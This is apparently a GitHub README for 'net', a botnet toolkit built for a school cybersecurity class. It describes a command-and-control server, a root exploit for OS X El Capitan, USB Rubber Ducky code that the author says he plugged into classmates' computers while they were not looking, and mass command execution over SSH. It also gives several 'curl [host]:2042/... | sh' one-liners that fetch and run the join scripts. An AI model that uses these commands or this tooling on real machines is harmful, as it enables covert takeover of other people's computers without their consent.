<img alt="Lynchburg College logo" src="https://bloximages.newyork1.vip.townnews.com/newsadvance.com/content/tncms/assets/v3/editorial/d/65/d65813d4-0da7-11e7-96af-4f86a016526b/58d0350ab3ae0.image.jpg" align="right" width=200>

# net
Code for building and administrating a rudimentary botnet.

**Please note that I strictly used this code for educational purposes. I do not and never have run a DDoSsing botnet or other such illegal operation and do not condone the use of this code for any malicious purpose.**

I used this code at the Virginia Residential Governor's School for Math, Science, and Technology to take over 36 Raspberry Pi microcomputers and Kali Linux desktops in the cybersecurity class in which I partook. This activity was part of the class, and I absolutely never violated any rules.

## How it works
### Command & Control
C&C is managed on ports `2042` & `2043` of a server. A simple Python script opens a socket on port `2043` which listens for incoming data from nodes. All requests to the server are printed to the terminal, and important ones may be written into `nodes.txt`.

To make control scripts available, run
```sh
python3 -m http.server 2042
```
from the `control` directory. This will use Python's inbuilt simple HTTP server to serve control scripts to nodes upon request.

### Joining
On macOS, two scripts are used to join a computer to the network, `join.sh` and `enact.sh`. `join.sh` allows one-command joining: it will download and decrypt an exploit needed to elevate (on OS X El Capitan) to a root shell and then run `enact.sh` in that root shell automatically. That script will handle joining the botnet. If you already have root access, you can just run `enact.sh` directly.

For GNU/Linux, there's just one script, `join.sh`, which must be executed as root or as a user with root privileges.

Here are simple one-liners to join the botnet:

Mac:
```sh
curl [host]:2042/mac/join.sh |sh
```
Linux:
```sh
curl [host]:2042/linux/join.sh |sh
```

To save time and keystrokes, you can use these shortcuts:
```sh
curl [host]:2042/jm |sh
curl [host]:2042/jl |sh
```

Or, to save even more time, you can skip the part where you think about what operating system the computer is using and simply type:
```sh
curl [host]:2042/join.sh |sh
```

Really in a hurry? There's a shortcut for this as well:
```sh
curl [host]:2042/j |sh
```

### Rubber Duck code
In the `duck` directory, you'll find Arduino code for delivering the join scripts automatically to macOS and Linux computers.

I used this code with a Digispark ATTINY85 drive, though it can be easily modified to work with other Rubber Duck USBs.

During the cybersecurity class in which I developed `net`, I plugged the drive into users' computers while they weren't looking, saving me the inconvenience of having to attain keyboard access.

To upload this code to your drive, follow [this tutorial](https://www.youtube.com/watch?v=fGmGBa-4cYQ).

### Tools
Running `tools/run.sh` followed by a string giving the command you'd like to run will cause all nodes in `nodes.txt` (in your working directory) to run that command through SSH. This is less useful now that cron control exists. You can also run `up.sh` to view which/how many nodes on the current network are online.

## Licensing
This software was created by [Erik Boesen](https://github.com/ErikBoesen) and is available under the [MIT License](LICENSE).

I'm not affiliated with Lynchburg College in any way, nor does the college endorse this software.
